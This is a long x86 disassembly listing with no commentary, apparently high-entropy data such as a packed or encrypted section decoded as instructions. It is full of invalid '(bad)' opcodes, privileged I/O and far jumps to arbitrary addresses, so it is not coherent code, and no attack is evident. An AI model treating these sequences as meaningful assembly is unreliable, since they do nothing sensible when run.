  42e7fb:	scas   eax,DWORD PTR es:[edi]
  42e7fc:	jns    0x42e869
  42e7fe:	xchg   edi,eax
  42e7ff:	jo     0x42e873
  42e801:	xor    edi,ecx
  42e803:	push   0x55877716
  42e808:	sbb    al,0x9d
  42e80a:	add    eax,0x52818b53
  42e80f:	lods   al,BYTE PTR ds:[esi]
  42e810:	es jnp 0x42e86b
  42e813:	gs imul cl
  42e816:	imul   eax,edx,0x9f361b22
  42e81c:	cmp    BYTE PTR [edi+0x16c897c7],ch
  42e822:	dec    ebp
  42e823:	mov    WORD PTR [esi],ds
  42e825:	retf   
  42e826:	mov    al,0x66
  42e828:	stos   DWORD PTR es:[edi],eax
  42e829:	xchg   edi,eax
  42e82a:	hlt    
  42e82b:	ins    BYTE PTR es:[edi],dx
  42e82c:	xchg   ecx,eax
  42e82d:	mov    ah,0x58
  42e82f:	fbld   TBYTE PTR [esi+0x3f4b9580]
  42e835:	sub    BYTE PTR [ebx+esi*2],dl
  42e838:	mov    dl,0x44
  42e83a:	cmp    bl,BYTE PTR [edx-0x1a]
  42e83d:	in     al,dx
  42e83e:	adc    ebp,DWORD PTR [ecx]
  42e840:	pop    ecx
  42e841:	inc    ebx
  42e842:	sbb    ebx,ebx
  42e844:	mov    esi,0x5bec7af8
  42e849:	pop    esi
  42e84a:	xchg   DWORD PTR [ecx],esi
  42e84c:	mov    al,0x85
  42e84e:	stos   BYTE PTR es:[edi],al
  42e84f:	sub    DWORD PTR [edi-0x18724027],ecx
  42e855:	adc    dl,BYTE PTR [edi]
  42e857:	fucomip st,st(5)
  42e859:	cmp    al,0x8d
  42e85b:	(bad)  
  42e85c:	pop    ds
  42e85d:	mov    ch,BYTE PTR [esi]
  42e85f:	ror    DWORD PTR cs:[eax+0x61],1
  42e863:	lahf   
  42e864:	xlat   BYTE PTR ds:[ebx]
  42e865:	mov    edi,0x8a8cf8ab
  42e86a:	jmp    FWORD PTR [eax-0xf9d81a]
  42e870:	mov    bl,cl
  42e872:	sub    BYTE PTR [edx+0x31],0xec
  42e876:	mov    edx,0xc00153d5
  42e87b:	mov    al,0xbe
  42e87d:	test   eax,0x55f8bdd7
  42e882:	stos   BYTE PTR es:[edi],al
  42e883:	xchg   edi,eax
  42e884:	jle    0x42e8cc
  42e886:	cmp    al,0xb5
  42e888:	jo     0x42e87f
  42e88a:	fdiv   DWORD PTR [edi]
  42e88c:	jmp    0xa40b:0xb391bfa5
  42e893:	bound  eax,QWORD PTR [ebp-0x36]
  42e896:	(bad)  
  42e897:	cmp    DWORD PTR [esi+edx*4+0x39],ebp
  42e89b:	adc    dh,BYTE PTR [ecx+0x1d4dfc01]
  42e8a1:	and    al,0x17
  42e8a3:	es enter 0x76bc,0x8a
  42e8a8:	dec    ebx
  42e8a9:	jae    0x42e8e1
  42e8ab:	xchg   edx,eax
  42e8ac:	(bad)  
  42e8ae:	(bad)  
  42e8af:	(bad)  
  42e8b1:	jne    0x42e8a4
  42e8b3:	into   
  42e8b4:	aas    
  42e8b5:	data16 cld 
  42e8b7:	aad    0xf3
  42e8b9:	mov    ds:0x2e9c16c8,al
  42e8be:	daa    
  42e8bf:	ss mov bh,0x40
  42e8c2:	(bad)  
  42e8c3:	shl    ebx,cl
  42e8c5:	in     al,dx
  42e8c6:	jg     0x42e93c
  42e8c8:	mov    BYTE PTR [esi-0x3c074eb2],dl
  42e8ce:	ret    0x5a97
  42e8d1:	sbb    eax,0x3a06d4a2
  42e8d6:	cli    
  42e8d7:	jl     0x42e8cd
  42e8d9:	pop    ebp
  42e8da:	push   ss
  42e8db:	pusha  
  42e8dc:	ret    
  42e8dd:	fwait
  42e8de:	xchg   esi,eax
  42e8df:	mov    al,0x8b
  42e8e1:	daa    
  42e8e2:	mov    esp,0xf0caafb0
  42e8e7:	ret    
  42e8e8:	xor    DWORD PTR [edx-0x452f28e5],eax
  42e8ee:	jmp    0x42e96a
  42e8f0:	jb     0x42e8c5
  42e8f2:	mov    edi,0x40588e13
  42e8f7:	test   al,0x96
  42e8f9:	sub    al,0x96
  42e8fb:	or     DWORD PTR [ebx+0x60c54aa9],ecx
  42e901:	test   eax,0xdb36f143
  42e906:	and    al,0xeb
  42e908:	fidivr WORD PTR [ebp+0x7fedb48a]
  42e90e:	jae    0x42e8f0
  42e910:	mov    ch,BYTE PTR [edi+0x6e7939e2]
  42e916:	jns    0x42e952
  42e918:	mov    WORD PTR [edx],?
  42e91a:	sbb    edx,DWORD PTR [esi+0x51]
  42e91d:	pusha  
  42e91e:	aad    0xf6
  42e920:	int3   
  42e921:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e922:	mov    edi,0xcad3ab6b
  42e927:	jne    0x42e934
  42e929:	iret   
  42e92a:	xchg   edx,eax
  42e92b:	sbb    BYTE PTR [ebx-0x67],bh
  42e92e:	addr16 aas 
  42e930:	std    
  42e931:	push   ebx
  42e932:	and    dh,BYTE PTR [ebx+0x6bbdae15]
  42e938:	nop
  42e939:	test   esp,esp
  42e93b:	lds    ebx,FWORD PTR [edx]
  42e93d:	mov    ecx,0xa4bd5dce
  42e942:	out    0x4,al
  42e944:	mov    edx,0x7f5bb409
  42e949:	pop    ebp
  42e94a:	and    BYTE PTR [ebp-0x76edfa5f],0x59
  42e951:	push   edx
  42e952:	and    eax,DWORD PTR ds:0xe45c9cce
  42e958:	stos   BYTE PTR es:[edi],al
  42e959:	sbb    edi,ebp
  42e95b:	in     al,dx
  42e95c:	jge    0x42e918
  42e95e:	(bad)  
  42e95f:	aad    0xb7
  42e961:	sti    
  42e962:	cwde   
  42e963:	sbb    eax,0x1d339a15
  42e968:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e969:	sub    bl,BYTE PTR [edi+0x16b6de6d]
  42e96f:	neg    DWORD PTR [edx-0x60b1db63]
  42e975:	mov    al,ds:0x8c3ebaf7
  42e97a:	outs   dx,BYTE PTR ds:[esi]
  42e97b:	push   ecx
  42e97c:	inc    ebp
  42e97d:	mov    bl,0xbb
  42e97f:	fdivrp st(2),st
  42e981:	cmp    dl,BYTE PTR [edi]
  42e983:	dec    edi
  42e984:	bound  ebp,QWORD PTR [ecx+ebx*4-0x6e868268]
  42e98b:	(bad)
  42e98e:	mov    dh,0xfe
  42e990:	scas   eax,DWORD PTR es:[edi]
  42e991:	ja     0x42e9e6
  42e993:	mov    cl,0x45
  42e995:	push   0x5c897eeb
  42e99a:	repnz push 0xffffffe1
  42e99d:	(bad)  
  42e99e:	sbb    DWORD PTR [esi+0x598f7c0e],ecx
  42e9a4:	stc    
  42e9a5:	lods   al,BYTE PTR ds:[esi]
  42e9a6:	(bad)  
  42e9a7:	out    dx,al
  42e9a8:	pop    ecx
  42e9a9:	push   ecx
  42e9aa:	add    DWORD PTR ds:0x5360556f,eax
  42e9b0:	xor    eax,0xa8d108fe
  42e9b5:	adc    DWORD PTR [eax+0x1],edx
  42e9b8:	cmp    al,0x37
  42e9ba:	lea    ecx,[esi-0x3f]
  42e9bd:	dec    edx
  42e9be:	loopne 0x42ea15
  42e9c0:	into   
  42e9c1:	shl    ah,0x8a
  42e9c4:	mov    edi,0xaa909953
  42e9c9:	popf   
  42e9ca:	jp     0x42e956
  42e9cc:	inc    esi
  42e9cd:	call   0x9215:0x518c2aaf
  42e9d4:	ror    BYTE PTR [eax-0x51],1
  42e9d7:	push   esi
  42e9d8:	out    0xcb,eax
  42e9da:	lods   eax,DWORD PTR ds:[esi]
  42e9db:	mov    edx,0x38d27111
  42e9e0:	inc    ecx
  42e9e1:	sar    BYTE PTR [ecx+ebp*8+0x554bf295],cl
  42e9e8:	push   eax
  42e9e9:	loop   0x42e9e7
  42e9eb:	loope  0x42ea0c
  42e9ed:	jecxz  0x42e97a
  42e9ef:	sahf   
  42e9f0:	arpl   WORD PTR [esi+ebx*8],sp
  42e9f3:	int    0x85
  42e9f5:	(bad)  
  42e9f6:	mov    ecx,0x3c173680
  42e9fb:	xchg   ecx,eax
  42e9fc:	das    
  42e9fd:	xor    esi,DWORD PTR [eax+0x57e1cbd6]
  42ea03:	pop    ss
  42ea04:	call   0xced35d77
  42ea09:	out    0x19,al
  42ea0b:	sahf   
  42ea0c:	int    0xf2
  42ea0e:	jp     0x42e9f1
  42ea10:	stc    
  42ea11:	pop    es
  42ea12:	(bad)  
  42ea13:	shl    BYTE PTR [eax+edi*4+0x45264c2d],cl
  42ea1a:	push   esi
  42ea1b:	xchg   edx,eax
  42ea1c:	inc    ebp
  42ea1d:	scas   al,BYTE PTR es:[edi]
  42ea1e:	sbb    esp,esi
  42ea20:	xor    ebx,DWORD PTR [edx+0x34620710]
  42ea26:	push   ecx
  42ea27:	aad    0x62
  42ea29:	inc    ecx
  42ea2a:	pop    edx
  42ea2b:	push   edi
  42ea2c:	jmp    0xd3f2:0x6e1b1ce9
  42ea33:	jae    0x42ea9a
  42ea35:	aas    
  42ea36:	test   DWORD PTR [ecx+0x23],esp
  42ea39:	sbb    DWORD PTR [esp+ecx*4-0x21],0xe5d9f87f
  42ea41:	push   esi
  42ea42:	jmp    0x6af2ac71
  42ea47:	inc    esp
  42ea48:	mov    ah,0x67
  42ea4a:	push   esp
  42ea4b:	popf   
  42ea4c:	xchg   ebx,eax
  42ea4d:	aam    0xe0
  42ea4f:	push   edx
  42ea50:	mov    ebx,0xba831dee
  42ea55:	ins    BYTE PTR es:[edi],dx
  42ea56:	add    al,0xd5
  42ea58:	push   edi
  42ea59:	mov    bh,0x8f
  42ea5b:	out    dx,al
  42ea5c:	add    ebx,edi
  42ea5e:	xchg   edi,eax
  42ea5f:	iret   
  42ea60:	mov    DWORD PTR [ecx-0x1],esp
  42ea63:	repz jge 0x42ea5e
  42ea66:	ret    
  42ea67:	mov    ebp,0x82fcfa78
  42ea6c:	into   
  42ea6d:	cbw    
  42ea6f:	jg     0x42ea5f
  42ea71:	sub    DWORD PTR [eax*2+0x6ee5f681],edi
  42ea78:	call   0xe04e:0x1b1175b6
  42ea7f:	outs   dx,BYTE PTR ds:[esi]
  42ea80:	pop    ss
  42ea81:	clc    
  42ea82:	aas    
  42ea83:	sbb    al,0x11
  42ea85:	add    BYTE PTR [edi-0x5b],ah
  42ea88:	sbb    eax,DWORD PTR gs:[bp+0x53]
  42ea8d:	and    ah,0xa9
  42ea90:	add    dh,BYTE PTR [ebp+0x7f13964c]
  42ea96:	cmp    al,0xcd
  42ea98:	xor    eax,0xf632b65f
  42ea9d:	ins    BYTE PTR es:[edi],dx
  42ea9e:	lea    esi,[edx-0x73abb83f]
  42eaa4:	dec    ecx
  42eaa5:	pop    esi
  42eaa6:	je     0x42eacf
  42eaa8:	pop    edi
  42eaa9:	test   al,0xd6
  42eaab:	mov    ebp,ebx
  42eaad:	mov    esp,0xdd370b1e
  42eab2:	ror    DWORD PTR [esi-0xe],cl
  42eab5:	call   0x45667bcc
  42eaba:	into   
  42eabb:	ds fwait
  42eabd:	gs sti 
  42eabf:	sub    eax,0xe3bf091b
  42eac4:	fstp   st(0)
  42eac6:	sbb    BYTE PTR [esi-0x6f],0x19
  42eaca:	xor    DWORD PTR [eax-0x27758131],eax
  42ead0:	(bad)  
  42ead1:	repz cmc 
  42ead3:	icebp  
  42ead4:	out    0xda,eax
  42ead6:	mov    ebx,0x37efe94d
  42eadb:	inc    esi
  42eadc:	and    eax,ebx
  42eade:	jno    0x42eb45
  42eae0:	pop    edi
  42eae1:	or     edx,ebp
  42eae3:	fisttp QWORD PTR [edx+0x21]
  42eae6:	xor    ah,ch
  42eae8:	add    BYTE PTR [ebp+0x1debe7fa],bl
  42eaee:	adc    DWORD PTR [eax+eiz*1+0x47],0x84aac4a5
  42eaf6:	pop    es
  42eaf7:	aad    0xef
  42eaf9:	dec    esp
  42eafa:	fisttp DWORD PTR [eax-0x13]
  42eafd:	or     al,dh
  42eaff:	stos   BYTE PTR es:[edi],al
  42eb00:	outs   dx,DWORD PTR ds:[esi]
  42eb01:	mov    ebp,0x6e07d49f
  42eb06:	(bad)
  42eb0a:	cli    
  42eb0b:	sti    
  42eb0c:	pop    ds
  42eb0d:	popa   
  42eb0e:	fcom   QWORD PTR ds:0xc69b92c2
  42eb14:	push   esp
  42eb15:	ins    DWORD PTR es:[edi],dx
  42eb16:	adc    ch,BYTE PTR [esi-0x1088b4ca]
  42eb1c:	sub    al,0xb
  42eb1e:	rcl    edi,cl
  42eb20:	loope  0x42eb31
  42eb22:	xor    eax,0x32fe3733
  42eb27:	into   
  42eb28:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42eb29:	dec    ecx
  42eb2a:	cmp    dh,BYTE PTR [ebx-0x33]
  42eb2d:	sbb    BYTE PTR [esi],bh
  42eb2f:	fsub   DWORD PTR [ebx]
  42eb31:	push   esi
  42eb32:	cmc    
  42eb33:	jnp    0x42eb79
  42eb35:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42eb36:	inc    BYTE PTR [ebp+0x58a703e1]
  42eb3c:	mov    ebx,0x5a90d69
  42eb41:	pop    es
  42eb42:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42eb43:	fadd   DWORD PTR [edi+eiz*2]
  42eb46:	pop    ebp
  42eb48:	dec    eax
  42eb49:	dec    esp
  42eb4a:	iret   
  42eb4b:	loopne 0x42eade
  42eb4d:	aad    0x8e
  42eb4f:	iret   
  42eb50:	push   ebp
  42eb51:	cmp    DWORD PTR [edx+0x60],edi
  42eb54:	mov    cl,0x4e
  42eb56:	add    eax,0x16d8f7be
  42eb5b:	mov    ecx,0x8e267af1
  42eb60:	aas    
  42eb61:	retf   0xdf4b
  42eb64:	dec    esi
  42eb65:	mov    al,0x6e
  42eb67:	(bad)  
  42eb68:	fadd   st,st(2)
  42eb6a:	dec    esi
  42eb6b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42eb6c:	inc    eax
  42eb6d:	sub    bl,BYTE PTR [ecx-0x14]
  42eb70:	push   ebp
  42eb71:	cmp    esi,DWORD PTR [eax-0x1d98e1e6]
  42eb77:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42eb78:	sub    DWORD PTR [ecx+0x62aa06e8],eax
  42eb7e:	ins    DWORD PTR es:[edi],dx
  42eb7f:	cmp    eax,0xce3384ab
  42eb84:	pop    ss
  42eb85:	dec    ecx
  42eb86:	sbb    eax,0xaf10e38f
  42eb8b:	adc    edx,edi
  42eb8d:	dec    eax
  42eb8e:	mov    DWORD PTR [esi-0xbbd81a5],ecx
  42eb94:	pop    es
  42eb95:	out    0x98,eax
  42eb97:	stc    
  42eb98:	xlat   BYTE PTR ds:[ebx]
  42eb99:	pop    es
  42eb9a:	dec    eax
  42eb9b:	pop    ebp
  42eb9c:	cwde   
  42eb9d:	lods   eax,DWORD PTR ds:[esi]
  42eb9e:	sbb    eax,DWORD PTR [ecx]
  42eba0:	xchg   ebp,eax
  42eba1:	es sub al,0x20
  42eba4:	mov    ebx,0xf14e3f3e
  42eba9:	loopne 0x42eb90
  42ebab:	into   
  42ebac:	scas   al,BYTE PTR es:[edi]
  42ebad:	mov    ds:0xce663791,al
  42ebb2:	nop
  42ebb3:	cwde   
  42ebb4:	jns    0x42eb47
  42ebb6:	repz (bad) 
  42ebb8:	cmp    al,0x42
  42ebba:	cld    
  42ebbb:	aad    0x3f
  42ebbd:	xchg   ebx,eax
  42ebbe:	adc    eax,0xd4da1a93
  42ebc3:	add    ecx,0x81fcb97d
  42ebc9:	sub    dl,ch
  42ebcb:	dec    eax
  42ebcc:	inc    esp
  42ebcd:	out    dx,al
  42ebce:	pop    ds
  42ebcf:	arpl   WORD PTR [ebp-0x25],si
  42ebd2:	adc    DWORD PTR [ebx+edx*4],ebp
  42ebd5:	push   ebp
  42ebd6:	push   ss
  42ebd7:	pop    ebx
  42ebd8:	(bad)  
  42ebd9:	loope  0x42ec47
  42ebdb:	fild   DWORD PTR [edx+0x45]
  42ebde:	and    BYTE PTR [ebp-0x2138c24d],bh
  42ebe4:	sti    
  42ebe5:	(bad)  
  42ebe6:	fnstenv [ebx+edx*4-0x71]
  42ebea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ebeb:	ds das 
  42ebed:	mov    cl,0xd3
  42ebef:	adc    DWORD PTR [esi+ecx*2+0x3e7be4b1],edi
  42ebf6:	into   
  42ebf7:	test   DWORD PTR [edi-0x3a507482],eax
  42ebfd:	cs dec eax
  42ebff:	leave  
  42ec00:	inc    esp
  42ec01:	clc    
  42ec02:	fisub  DWORD PTR [eax]
  42ec04:	leave  
  42ec05:	icebp  
  42ec06:	and    dh,BYTE PTR [ecx]
  42ec08:	xor    DWORD PTR [eax],edx
  42ec0a:	mov    ch,0xaa
  42ec0c:	xchg   ecx,eax
  42ec0d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ec0e:	scas   al,BYTE PTR es:[edi]
  42ec0f:	es dec edx
  42ec11:	adc    DWORD PTR [ebx-0x2a767454],eax
  42ec17:	outs   dx,DWORD PTR ds:[esi]
  42ec18:	stc    
  42ec19:	xor    al,0xa5
  42ec1b:	aam    0x3d
  42ec1d:	and    al,0x56
  42ec1f:	aas    
  42ec20:	dec    eax
  42ec21:	push   0x44184bea
  42ec26:	mov    bl,0x1e
  42ec28:	out    dx,eax
  42ec29:	cli    
  42ec2a:	push   es
  42ec2b:	cmp    ecx,edi
  42ec2d:	push   ds
  42ec2e:	lods   eax,DWORD PTR ds:[esi]
  42ec2f:	pop    ebp
  42ec30:	hlt    
  42ec31:	(bad)  
  42ec32:	xchg   ebx,eax
  42ec33:	mov    edx,0x48a9a9f2
  42ec38:	stos   BYTE PTR es:[edi],al
  42ec39:	test   al,0x45
  42ec3b:	gs jmp 0x42ec43
  42ec3e:	push   0xf4a5fd1c
  42ec43:	jge    0x42ec71
  42ec45:	shr    DWORD PTR [eax+0x5315482],cl
  42ec4b:	aas    
  42ec4c:	jg     0x42ecab
  42ec4e:	adc    al,0x15
  42ec50:	aam    0x7f
  42ec52:	lahf   
  42ec53:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ec54:	rcl    DWORD PTR [edi+0x557caf55],0x42
  42ec5b:	fisttp QWORD PTR [ebx+eax*4-0x5]
  42ec5f:	stos   DWORD PTR es:[edi],eax
  42ec60:	mov    ds:0xdb95c548,eax
  42ec65:	push   0x14d2074c
  42ec6a:	in     eax,dx
  42ec6b:	fstp   QWORD PTR [edi]
  42ec6d:	mov    dh,0x50
  42ec6f:	stc    
  42ec70:	jmp    0x4a95:0xbc7470c7
  42ec77:	xor    eax,0x14fe7142
  42ec7c:	xchg   BYTE PTR [edi-0x6abcc804],bh
  42ec82:	int    0x42
  42ec84:	and    eax,0x92662927
  42ec89:	xor    al,0xb5
  42ec8b:	mov    ecx,0x50c89f98
  42ec90:	xchg   ebx,eax
  42ec91:	jge    0x42ec8a
  42ec93:	mov    DWORD PTR [ecx],esp
  42ec95:	pop    ds
  42ec96:	sbb    eax,0x13bd78f
  42ec9b:	jne    0x42ec96
  42ec9d:	lods   eax,DWORD PTR ds:[esi]
  42ec9e:	pop    esp
  42ec9f:	pop    eax
  42eca0:	int3   
  42eca1:	mov    cl,0xad
  42eca3:	fisttp QWORD PTR [ecx+0x54]
  42eca6:	imul   ebp,DWORD PTR [ecx+0x7d4b3ed],0x69
  42ecad:	mov    dh,0xb4
  42ecaf:	(bad)  
  42ecb1:	cmp    eax,0x8e1e8f03
  42ecb6:	icebp  
  42ecb7:	(bad)  
  42ecb8:	div    ebp
  42ecba:	jno    0x42ec9d
  42ecbc:	lock add ch,BYTE PTR [ebp-0x79bb6769]
  42ecc3:	mov    WORD PTR [ebp+edi*2-0x2b69c69],es
  42ecca:	cdq    
  42eccb:	aas    
  42eccc:	mov    ebp,0x528ebe6f
  42ecd1:	dec    esi
  42ecd2:	sar    BYTE PTR [eax],cl
  42ecd4:	and    dl,BYTE PTR [ebp-0x6c]
  42ecd7:	dec    eax
  42ecd8:	xor    eax,0x18d2f180
  42ecdd:	cli    
  42ecde:	jmp    0x41cb:0xabc2d7d2
  42ece5:	std    
  42ece6:	cmp    BYTE PTR [ebx+ecx*8+0x1f33cb47],bh
  42eced:	mov    ds:0x853d7c25,al
  42ecf2:	hlt    
  42ecf3:	sub    BYTE PTR [ebx],dl
  42ecf5:	(bad)  
  42ecf7:	dec    edx
  42ecf8:	(bad)  [esi+0x31]
  42ecfb:	in     al,0xc2
  42ecfd:	jmp    FWORD PTR ds:0xe76269ee
  42ed03:	setno  BYTE PTR [ebx]
  42ed06:	sub    edx,edi
  42ed08:	pushf  
  42ed09:	ins    DWORD PTR es:[edi],dx
  42ed0a:	and    DWORD PTR ds:0xb6eac09f,edi
  42ed10:	adc    esi,ebx
  42ed12:	(bad)  
  42ed13:	inc    edx
  42ed14:	and    eax,0xf0ee6793
  42ed19:	or     al,0xd6
  42ed1b:	inc    eax
  42ed1c:	xor    BYTE PTR [esi+0x3ecc2b6b],0x91
  42ed23:	(bad)
  42ed26:	inc    ebp
  42ed27:	aas    
  42ed28:	cmp    al,BYTE PTR [ecx-0x36]
  42ed2b:	and    bh,ch
  42ed2d:	mov    eax,0x94e289b3
  42ed32:	cmp    al,al
  42ed34:	inc    edx
  42ed35:	mov    cl,0x9e
  42ed37:	push   ds
  42ed38:	mov    esp,0x420e2734
  42ed3d:	in     al,0x62
  42ed3f:	out    0x42,al
  42ed41:	call   0x13b9:0xd6eff37
  42ed48:	jae    0x42ece6
  42ed4a:	cld    
  42ed4b:	(bad)  
  42ed4c:	xor    al,0xd5
  42ed4e:	xchg   edx,eax
  42ed4f:	cdq    
  42ed50:	sbb    eax,0xb612fd5f
  42ed55:	xchg   esi,eax
  42ed56:	and    BYTE PTR [esi-0x38d9c4b0],ah
  42ed5c:	repz sbb dl,bh
  42ed5f:	call   FWORD PTR [edi]
  42ed61:	pop    es
  42ed62:	(bad)  
  42ed63:	arpl   WORD PTR [esi+eiz*4+0x2757fd11],bx
  42ed6a:	inc    ebx
  42ed6b:	imul   ebx,ebp,0x8fd8abfb
  42ed71:	xchg   esi,eax
  42ed73:	les    esp,FWORD PTR [esi]
  42ed75:	jne    0x42ed31
  42ed77:	mov    eax,ds:0x93a863fa
  42ed7c:	cmp    DWORD PTR [edx],0x28d27002
  42ed82:	mov    ss,WORD PTR [eax+0x25]
  42ed85:	rol    DWORD PTR [ecx],0x7d
  42ed88:	cmp    DWORD PTR [ebx],0x74
  42ed8b:	add    al,0xd0
  42ed8d:	sub    ebx,DWORD PTR [edi+0x57]
  42ed90:	aas    
  42ed91:	clc    
  42ed92:	dec    esi
  42ed93:	int3   
  42ed94:	push   edi
  42ed95:	fimul  WORD PTR [esi-0x2c7b253b]
  42ed9b:	fld    st(3)
  42ed9d:	fmul   st,st(4)
  42ed9f:	outs   dx,DWORD PTR ds:[esi]
  42eda0:	test   DWORD PTR [edi-0x60ee740b],edx
  42eda6:	shr    BYTE PTR [edx-0x4e],0xe1
  42edaa:	icebp  
  42edab:	aaa    
  42edac:	repz fimul DWORD PTR [ebx]
  42edaf:	mov    edi,0xebc36067
  42edb4:	in     eax,0xaa
  42edb6:	sub    DWORD PTR [edx],edx
  42edb8:	scas   eax,DWORD PTR es:[edi]
  42edb9:	std    
  42edba:	mov    gs,WORD PTR [esi]
  42edbc:	dec    ebx
  42edbd:	or     eax,ebp
  42edbf:	fcmovne st,st(2)
  42edc1:	mov    eax,0x98928fcd
  42edc6:	cli    
  42edc7:	and    al,bl
  42edc9:	inc    edi
  42edca:	jmp    FWORD PTR [eax]
  42edcc:	dec    edi
  42edcd:	ror    DWORD PTR [ebp-0x51be4947],1
  42edd3:	jecxz  0x42edb5
  42edd5:	cld    
  42edd6:	sub    eax,ebx
  42edd8:	bound  eax,QWORD PTR [eax-0x76]
  42eddb:	js     0x42ee5a
  42eddd:	adc    eax,0xb8268e86
  42ede2:	jmp    0x42ed87
  42ede4:	in     eax,dx
  42ede5:	clc    
  42ede6:	fisubr DWORD PTR [ebp-0x34]
  42ede9:	gs fwait
  42edeb:	cmp    BYTE PTR [esi+0x1fe5c6d7],dh
  42edf1:	jb     0x42ede4
  42edf3:	rcr    bl,1
  42edf5:	pop    ds
  42edf6:	adc    al,0xa8
  42edf8:	in     al,0xc3
  42edfa:	rcr    cl,1
  42edfc:	mov    ch,BYTE PTR [ebx-0x617ec28b]
  42ee02:	add    DWORD PTR [ecx+0xe497b9c],esi
  42ee08:	popf   
  42ee09:	mov    al,ds:0xd193b375
  42ee0e:	out    0x72,eax
  42ee10:	or     al,0x1f
  42ee12:	xlat   BYTE PTR ds:[ebx]
  42ee13:	cmp    al,0xc4
  42ee15:	mov    esp,0xc61ae9c0
  42ee1a:	je     0x42eda5
  42ee1c:	retf   0x818c
  42ee1f:	idiv   DWORD PTR [ecx+edi*2]
  42ee22:	popf   
  42ee23:	sub    cl,bl
  42ee25:	outs   dx,BYTE PTR ds:[esi]
  42ee26:	adc    dh,BYTE PTR [edi]
  42ee28:	fild   WORD PTR [ebx+0x6c]
  42ee2b:	jb     0x42eeab
  42ee2d:	cmp    DWORD PTR [edx-0x56],ecx
  42ee30:	jge    0x42edf1
  42ee32:	push   ecx
  42ee33:	mov    esi,0x5ca340fe
  42ee38:	push   esi
  42ee39:	jnp    0x42ee12
  42ee3b:	jp     0x42edff
  42ee3d:	sar    DWORD PTR [edx+0x72beb636],cl
  42ee43:	scas   eax,DWORD PTR es:[edi]
  42ee44:	shl    bl,0x93
  42ee47:	sbb    al,0xb9
  42ee49:	jmp    FWORD PTR [edi]
  42ee4b:	and    bl,BYTE PTR [edx+esi*4+0x38f343b9]
  42ee52:	fdiv   QWORD PTR [edx-0x7e9949b6]
  42ee58:	lock jns 0x42ee25
  42ee5b:	push   esi
  42ee5c:	in     eax,dx
  42ee5d:	mov    BYTE PTR [edx-0x62],ch
  42ee60:	jmp    0xf53721f8
  42ee65:	sbb    ecx,DWORD PTR [eax+0x77095b95]
  42ee6b:	jne    0x42edf5
  42ee6d:	inc    ebx
  42ee6e:	xchg   edi,eax
  42ee6f:	and    eax,0x11d5ceb7
  42ee74:	into   
  42ee75:	xchg   BYTE PTR [edi+0x6279183b],dh
  42ee7b:	push   ecx
  42ee7c:	rol    DWORD PTR ss:[ebx+ebp*4-0x3e0f788d],1
  42ee84:	sbb    al,ch
  42ee86:	cdq    
  42ee87:	daa    
  42ee88:	dec    ecx
  42ee89:	(bad)  
  42ee8a:	cmp    esi,DWORD PTR [eax+0x76]
  42ee8d:	mov    edx,0x1dca0ff1
  42ee92:	lea    esp,[esi-0x32]
  42ee95:	mov    BYTE PTR [edi-0x50],dl
  42ee98:	sti    
  42ee99:	inc    edx
  42ee9a:	cmp    BYTE PTR [ebp+0x2e],bh
  42ee9d:	loope  0x42ee4e
  42ee9f:	jbe    0x42eee3
  42eea1:	mov    ebx,0x9fdd81de
  42eea6:	adc    al,0xb8
  42eea8:	sti    
  42eea9:	push   ebp
  42eeaa:	mov    dx,0x1816
  42eeae:	xor    al,0x8f
  42eeb0:	push   eax
  42eeb1:	sbb    eax,0xaf4f39f9
  42eeb6:	std    
  42eeb7:	push   esi
  42eeb8:	pop    ebp
  42eeb9:	add    edx,DWORD PTR [ebp-0x76]
  42eebc:	repz cwde 
  42eebe:	scas   al,BYTE PTR es:[edi]
  42eebf:	fsubr  DWORD PTR [edx+0x2755bae]
  42eec5:	push   edx
  42eec6:	mov    DWORD PTR [eax-0x3ab24d56],0x83ae5403
  42eed0:	jmp    0xcfa8:0xa29aa085
  42eed7:	inc    edi
  42eed8:	jne    0x42ee9f
  42eeda:	into   
  42eedb:	jmp    0x5c97:0x46896848
  42eee2:	aad    0xa
  42eee4:	dec    esp
  42eee5:	add    eax,0x6a3a8cfa
  42eeea:	push   0xd3f7bfd5
  42eeef:	cmp    BYTE PTR [edi],dh
  42eef1:	psrlw  mm5,QWORD PTR [eax]
  42eef4:	lods   al,BYTE PTR ds:[esi]
  42eef5:	shl    DWORD PTR [esi+eiz*8+0x6f],1
  42eef9:	rcl    BYTE PTR [edi+0x437e2c52],cl
  42eeff:	pusha  
  42ef00:	jmp    0x42ef27
  42ef02:	jb     0x42eed3
  42ef04:	xchg   ebx,eax
  42ef05:	les    ecx,FWORD PTR [edi-0x4]
  42ef08:	adc    edi,edx
  42ef0a:	adc    ecx,DWORD PTR [edi-0x654093ce]
  42ef10:	mov    ds:0x2fc05f4f,eax
  42ef15:	xor    BYTE PTR [ecx+0x6b],bl
  42ef18:	or     BYTE PTR [edx],dh
  42ef1a:	xor    dl,BYTE PTR [edx-0x1190721c]
  42ef20:	adc    al,0xc3
  42ef22:	fwait
  42ef23:	loopne 0x42eeee
  42ef25:	jge    0x42ef1a
  42ef27:	clc    
  42ef28:	fnsave [ebp-0x50f60306]
  42ef2e:	(bad)  
  42ef2f:	cs push 0x5dd6cf20
  42ef35:	pop    esi
  42ef36:	in     al,dx
  42ef37:	push   es
  42ef38:	xor    esi,DWORD PTR [ebx-0x59]
  42ef3b:	bound  ecx,QWORD PTR [ebx+ecx*1]
  42ef3e:	lods   al,BYTE PTR ds:[esi]
  42ef3f:	into   
  42ef40:	mov    eax,ebp
  42ef42:	xor    dl,BYTE PTR [esi]
  42ef44:	or     ebp,esp
  42ef46:	fsubr  QWORD PTR ds:0x622a670a
  42ef4c:	mov    al,0x16
  42ef4e:	mov    cl,0x34
  42ef50:	stc    
  42ef51:	fdiv   DWORD PTR [edx-0x37]
  42ef54:	fstp   TBYTE PTR [ecx]
  42ef56:	cmc    
  42ef57:	mov    edx,0x8d772fcf
  42ef5c:	cmp    cl,BYTE PTR [ebx-0x5d]
  42ef5f:	jo     0xf996f59f
  42ef65:	adc    BYTE PTR [ebp-0x6],ch
